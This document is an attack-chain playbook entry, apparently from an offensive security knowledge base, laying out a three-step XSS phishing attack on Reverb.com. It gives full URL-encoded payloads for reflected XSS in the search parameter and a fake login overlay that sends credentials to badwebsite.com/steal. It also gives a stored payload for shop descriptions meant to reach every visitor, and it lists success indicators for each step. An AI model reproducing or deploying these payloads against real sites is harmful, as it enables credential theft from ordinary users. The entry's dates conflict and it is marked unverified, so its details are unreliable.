---
tags:
  - xss
  - phishing
  - web
  - credential-theft
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Test-Reflected-XSS-in-Reverb-Search-Query]]'
  - '[[procedures/Craft-Phishing-Payload-for-Reverb-XSS]]'
  - '[[procedures/Exploit-Stored-XSS-in-Reverb-Shop-Descriptions]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
description: >-
  Multi-stage XSS exploitation in Reverb.com's search functionality and shop
  descriptions to create persistent and reflected phishing overlays mimicking
  login forms for credential theft.
skill_level: intermediate
impact_level: high
id: 9bbd7da4-23c1-4028-a5e9-b7f890e2d1bf
created_at: '2025-12-14T03:47:18.350Z'
updated_at: '2025-12-14T03:47:18.350Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Reverb-XSS-Phishing-via-Search-Query-and-Shop-Descriptions

Multi-stage attack chain demonstrating XSS exploitation in Reverb.com to spoof login interfaces and phish user credentials.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discover Reflected XSS in Search] --> B[Craft Phishing Payload]
    B --> C[Deploy Persistent XSS in Shop]
    C --> D[Phish Credentials]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Chrome with Developer Tools)
- URL encoder (built-in or online tool)

### Target Environment

- Reverb.com web application
- Access to marketplace search and shop creation/editing

### Initial Access Requirements

- No credentials required for search-based reflected XSS
- Shop owner account for stored XSS in descriptions
- Network access to Reverb.com

## Detailed Attack Procedures

### Step 1: Discover Reflected XSS in Search
procedure: [[procedures/Test-Reflected-XSS-in-Reverb-Search-Query]]

**Objective**: Identify that user input in the search query parameter renders unsanitized HTML, allowing tag injection.

**Instructions**: Navigate to the Reverb marketplace search URL and append a simple HTML test payload to the 'query' parameter. For example, use: https://reverb.com/marketplace?query=%3Cscript%3Ealert(1)%3C/script%3E. Observe if the script executes or HTML renders.

To test basic rendering without alerts (to avoid detection), inject: https://reverb.com/marketplace?query=%3Ca%20href%3D%22http://example.com%22%3E%3Cspan%20class%3D%22btn%20button%20button--orange%20button--wide%22%3EXSS%3C/a%3E%3C/span%3E.

**Expected Output**: The HTML link renders as a styled button on the search results page, confirming lack of sanitization.

**Success Indicators**:
- HTML tags appear unescaped in the page source
- Injected elements render visually with site CSS classes

### Step 2: Craft Phishing Payload
procedure: [[procedures/Craft-Phishing-Payload-for-Reverb-XSS]]

**Objective**: Build a complex HTML payload that overlays a fake Reverb login form using legitimate site classes to phish credentials.

**Instructions**: Encode a payload that creates a div overlay with Reverb's CSS classes for authenticity. Example payload (URL-encoded for search): %3Cdiv%20class%3D%22fotorama--fullscreen%20fancybox-mobile%20fancybox-type-html%20fancybox-opened%22%3E%3Cdiv%20class%3D%22modal-body%22%3E%3Ch1%3EAccount%20Locked%3C/h1%3E%3Cp%3EPlease%20login%20to%20unlock.%3C/p%3E%3Cform%20action%3D%22http://badwebsite.com/steal%22%3E%3Cinput%20type%3D%22email%22%20placeholder%3D%22Email%22%3E%3Cinput%20type%3D%22password%22%20placeholder%3D%22Password%22%3E%3Ca%20href%3D%22%23%22%20class%3D%22btn%20button%20button--orange%20button--wide%22%3ELogin%3C/a%3E%3C/form%3E%3C/div%3E%3C/div%3E.

Inject into search: https://reverb.com/marketplace?query=[encoded-payload]. Use browser dev tools to inspect and copy exact classes like 'btn button--orange' from real elements.

**Expected Output**: A modal-like phishing box appears over the search results, indistinguishable from legitimate UI, directing form submissions to attacker-controlled site.

**Success Indicators**:
- Fake login form renders with Reverb styling
- Form submission redirects to external phishing endpoint

### Step 3: Deploy Persistent XSS
procedure: [[procedures/Exploit-Stored-XSS-in-Reverb-Shop-Descriptions]]

**Objective**: Inject the phishing payload into a shop description for persistent exposure to all visitors.

**Instructions**: If you control a shop (e.g., 'this-is-bad-shop'), edit the description field and insert the HTML payload: %3Cdiv%20class%3D%22bottom-alert%20videos-header%22%3E%3Ch4%3EWarning:%20Account%20Issue%3C/h4%3E%3Cp%3E%3Cform%20action%3D%22http://badwebsite.com/steal%22%3EEmail:%20%3Cinput%20type%3D%22email%22%3E%20Password:%20%3Cinput%20type%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Unlock%22%20class%3D%22btn%22%3E%3C/form%3E%3C/p%3E%3Chr%3E%3C/div%3E.

Save and visit /shop/this-is-bad-shop to confirm. The payload persists across sessions.

**Expected Output**: Shop page displays the injected phishing prompt to all viewers, increasing compromise potential.

**Success Indicators**:
- Payload renders on shop page without errors
- Visible to non-owner users, enabling broad phishing

## Attack Chain Summary

### Key Achievements

1. Confirmed reflected XSS in search for immediate UI spoofing
2. Created realistic phishing overlays using site CSS
3. Achieved persistent XSS in shops for ongoing credential theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
